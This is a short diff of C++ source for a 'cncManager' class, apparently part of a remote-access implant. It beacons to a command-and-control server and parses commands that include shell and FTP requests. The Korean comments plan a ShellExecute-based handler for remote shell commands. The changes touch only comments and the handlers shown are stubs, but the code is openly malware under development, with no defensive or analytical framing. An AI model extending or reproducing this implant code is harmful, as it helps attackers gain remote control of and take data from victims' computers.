@@ -109,7 +109,7 @@ void cncManager::sendData(UCHAR DDtype, DWORD dlen, LPVOID data) {
     //else
 }
 /* C&C에 beacon 보내는 함수. sendHttpRequest를 Wrapping함.*/
-/* 이 함수는 단일 스레드로 돌려야할듯. */
+/* 이 함수는 별도 스레드로 돌려야할듯. */
 void cncManager::sendBeacon() {
 	DDprotocol* beaconFrame = new DDprotocol;
 	beaconFrame->type = beaconRequest;
@@ -143,6 +143,7 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
         
 
         else {
+            /* response 핸들러 구현부 */
             switch (resData->type)
             {
             case error:
@@ -155,6 +156,7 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
 
             case shellRequest:
                 std::cout << "shellRequest !!!" << std::endl;
+                //ShellExecute 사용하는 함수 만들면 될듯.
                 break;
 
             case ftpReqeust:
